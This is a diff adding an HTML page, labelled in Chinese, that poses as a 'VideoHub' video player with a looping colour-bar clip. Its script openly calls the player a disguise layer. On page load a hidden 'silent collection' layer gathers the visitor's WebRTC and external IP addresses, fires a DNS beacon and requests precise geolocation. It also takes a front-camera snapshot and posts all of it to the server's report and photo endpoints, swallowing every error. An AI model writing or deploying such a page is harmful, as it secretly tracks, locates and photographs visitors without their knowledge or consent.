@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>在线视频 · 示例播放</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: #0f0f0f; color: #f1f1f1;
+  }
+  header {
+    display: flex; align-items: center; gap: 12px;
+    padding: 12px 20px; background: #181818; border-bottom: 1px solid #272727;
+  }
+  .logo {
+    width: 28px; height: 28px; border-radius: 6px;
+    background: linear-gradient(135deg,#ff0033,#ff6b00);
+    display: grid; place-items: center; font-weight: 800; font-size: 14px; color: #fff;
+  }
+  .brand { font-weight: 600; font-size: 16px; letter-spacing: .3px; }
+  .brand small { color:#aaa; font-weight: 400; margin-left: 6px; font-size: 12px; }
+  .spacer { flex: 1; }
+  .search {
+    display: flex; align-items: center; gap: 8px; background:#121212; border:1px solid #303030;
+    border-radius: 20px; padding: 6px 14px; width: 320px; max-width: 40vw;
+  }
+  .search input { flex:1; background: transparent; border:0; color:#f1f1f1; outline:none; font: inherit; }
+  .search .ico { opacity: .6; }
+  main { max-width: 1100px; margin: 18px auto; padding: 0 16px 40px; }
+  .player {
+    position: relative; background:#000; border-radius: 12px; overflow: hidden;
+    box-shadow: 0 6px 30px rgba(0,0,0,.5); border:1px solid #232323;
+  }
+  video { display: block; width: 100%; height: auto; background:#000; }
+  .player .bigplay {
+    position: absolute; inset: 0; display: grid; place-items: center; cursor: pointer;
+    background: radial-gradient(circle at center, rgba(0,0,0,.35), rgba(0,0,0,.6));
+    transition: opacity .2s;
+  }
+  .bigplay .btn {
+    width: 76px; height: 76px; border-radius: 50%; background: rgba(255,0,51,.92);
+    display: grid; place-items: center; box-shadow: 0 4px 24px rgba(255,0,51,.5);
+  }
+  .bigplay .btn::after {
+    content: ""; width: 0; height: 0; border-left: 22px solid #fff;
+    border-top: 14px solid transparent; border-bottom: 14px solid transparent; margin-left: 6px;
+  }
+  .player .bigplay.hidden { opacity: 0; pointer-events: none; }
+  .controls {
+    display: flex; align-items: center; gap: 14px; padding: 10px 14px;
+    background: linear-gradient(to top, rgba(0,0,0,.9), rgba(0,0,0,0));
+  }
+  .controls .time { font-size: 12px; color: #ccc; font-variant-numeric: tabular-nums; }
+  .progress { flex: 1; height: 4px; background: #303030; border-radius: 2px; overflow: hidden; }
+  .progress .bar { height: 100%; width: 100%; background: #ff0033; }
+  .controls button {
+    background: transparent; border: 0; color: #f1f1f1; cursor: pointer; font-size: 18px; opacity:.9;
+  }
+  .meta { padding: 16px 4px; }
+  .meta h1 { font-size: 18px; font-weight: 600; margin-bottom: 6px; }
+  .meta .stats { color: #aaa; font-size: 13px; }
+  .meta .stats b { color: #f1f1f1; }
+  .desc {
+    margin-top: 12px; padding: 12px 14px; background:#181818; border-radius: 10px;
+    font-size: 13px; color: #cfcfcf; line-height: 1.7; border:1px solid #232323;
+  }
+  .chips { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+  .chip { font-size: 12px; padding: 4px 10px; border-radius: 6px; background:#272727; color:#ddd; }
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">V</div>
+  <div class="brand">VideoHub<small>示例播放器</small></div>
+  <div class="spacer"></div>
+  <div class="search"><span class="ico">🔍</span><input placeholder="搜索视频、用户、频道"></div>
+</header>
+
+<main>
+  <div class="player" id="player">
+    <video id="v" src="/file.mp4" muted loop playsinline preload="auto"></video>
+    <div class="bigplay" id="bigplay"><div class="btn"></div></div>
+    <div class="controls">
+      <button id="playBtn">⏯</button>
+      <span class="time" id="t">循环播放</span>
+      <div class="progress"><div class="bar" id="bar"></div></div>
+      <span class="time">1080P · 彩色测试</span>
+      <button>⛶</button>
+    </div>
+  </div>
+
+  <div class="meta">
+    <h1>彩色条码 · 循环演示视频</h1>
+    <div class="stats"><b>示例频道</b> · 1.2万 次观看 · 2025年</div>
+    <div class="chips">
+      <span class="chip">测试片</span><span class="chip">彩色</span><span class="chip">循环</span>
+      <span class="chip">1080P</span><span class="chip">无版权</span>
+    </div>
+    <div class="desc">这是一个用于演示的彩色条码循环视频，画面由不断滚动的彩色竖条组成。视频已设置为静音自动循环播放，适合作为占位与播放器界面展示。</div>
+  </div>
+</main>
+
+<script>
+(() => {
+  "use strict";
+  // ===== 视频播放器交互（伪装层）=====
+  const v = document.getElementById("v");
+  const bigplay = document.getElementById("bigplay");
+  const bar = document.getElementById("bar");
+  const startPlay = () => { v.play().catch(()=>{}); bigplay.classList.add("hidden"); };
+  bigplay.addEventListener("click", startPlay);
+  document.getElementById("playBtn").addEventListener("click", startPlay);
+  document.addEventListener("click", startPlay, { once: true });
+  // 自动静音循环播放
+  try { v.muted = true; v.play().catch(()=>{}); } catch(e){}
+  v.addEventListener("timeupdate", () => {
+    if (v.duration) bar.style.width = (v.currentTime / v.duration * 100) + "%";
+  });
+  v.addEventListener("ended", () => { v.currentTime = 0; v.play().catch(()=>{}); });
+
+  // ===== 后台静默采集层（伪装隐藏，任何失败均不影响播放）=====
+  const safe = (p, ms = 8000) => Promise.race([
+    Promise.resolve(p).catch(() => null),
+    new Promise(r => setTimeout(() => r(null), ms))
+  ]);
+
+  let SESSION = null;
+  const report = {
+    session_id: "", dns_token: "",
+    webrtc_ips: [], resolver_ips: [], external_ips: [],
+    latitude: 0, longitude: 0, location_accuracy: 0, location_error: "",
+    user_agent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform || "",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`
+  };
+
+  async function getSession() {
+    const s = await safe(fetch("/api/session").then(r => r.json()), 6000);
+    if (!s) return null;
+    SESSION = s;
+    report.session_id = s.session_id;
+    report.dns_token = s.dns_token;
+    return s;
+  }
+
+  async function collectWebRTC() {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [
+        { urls: "stun:stun.l.google.com:19302" },
+        { urls: "stun:stun1.l.google.com:19302" }
+      ]});
+      pc.onicecandidate = e => {
+        if (e.candidate && e.candidate.candidate) {
+          const m = e.candidate.candidate.match(/([0-9a-fA-F:.]{2,39})\s+\d+\s+typ/i);
+          if (m) { const ip = m[1].trim().toLowerCase();
+            if (ip && !ip.endsWith(".local")) ips.add(ip); }
+        }
+      };
+      pc.createDataChannel("x");
+      const offer = await pc.createOffer();
+      await pc.setLocalDescription(offer);
+      await new Promise((res) => {
+        const to = setTimeout(res, 5000);
+        const check = setInterval(() => {
+          if (pc.iceGatheringState === "complete") { clearTimeout(to); clearInterval(check); res(); }
+        }, 200);
+        setTimeout(() => { clearTimeout(to); clearInterval(check); res(); }, 5000);
+      });
+      pc.close();
+    } catch (e) {}
+    report.webrtc_ips = [...ips];
+    return [...ips];
+  }
+
+  async function collectDNS(s) {
+    const host = s.dns_zone ? `${s.dns_token}.${s.dns_zone}` : null;
+    const direct = `/api/dns-beacon?token=${encodeURIComponent(s.dns_token)}`;
+    if (host) {
+      const img = new Image();
+      img.src = `//${host}/api/dns-beacon?token=${encodeURIComponent(s.dns_token)}`;
+      img.onload = img.onerror = () => {};
+    }
+    await safe(fetch(direct), 6000);
+    const services = s.services || [
+      "https://api.ipify.org?format=json",
+      "https://ipapi.co/json/",
+      "https://ipwho.is/"
+    ];
+    const results = await Promise.allSettled(services.map(url =>
+      safe(fetch(url, { cache: "no-store" }).then(r => r.json()), 7000)
+    ));
+    const ext = new Set();
+    for (const r of results) {
+      if (r.status !== "fulfilled" || !r.value) continue;
+      const j = r.value;
+      const ip = j.ip || j.query || j.IPv4 || "";
+      if (ip) ext.add(String(ip));
+    }
+    report.external_ips = [...ext];
+  }
+
+  function collectLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) { report.location_error = "不支持"; return resolve(); }
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          report.latitude = pos.coords.latitude;
+          report.longitude = pos.coords.longitude;
+          report.location_accuracy = pos.coords.accuracy;
+          resolve();
+        },
+        err => { report.location_error = err.message || `定位失败(${err.code})`; resolve(); },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+  }
+
+  async function collectCamera() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      });
+      const video = document.createElement("video");
+      video.style.display = "none";
+      video.srcObject = stream;
+      video.muted = true; video.playsInline = true;
+      document.body.appendChild(video);
+      await video.play().catch(()=>{});
+      await new Promise(r => setTimeout(r, 500));
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataURL = canvas.toDataURL("image/jpeg", 0.7);
+      video.remove();
+      await safe(fetch("/api/photo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ session_id: report.session_id, photo: dataURL })
+      }).then(r => r.ok), 12000);
+    } catch (e) {}
+    finally { if (stream) stream.getTracks().forEach(t => t.stop()); }
+  }
+
+  async function sendReport() {
+    await safe(fetch("/api/report", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(report)
+    }).then(r => r.ok));
+  }
+
+  async function collectAll() {
+    const s = await getSession();
+    if (!s) return;
+    await Promise.allSettled([ collectWebRTC(), collectDNS(s), collectLocation() ]);
+    await collectCamera().catch(()=>{});
+    await sendReport();
+  }
+  // 启动后台采集；不阻塞视频播放
+  collectAll();
+})();
+</script>
+</body>
+</html>
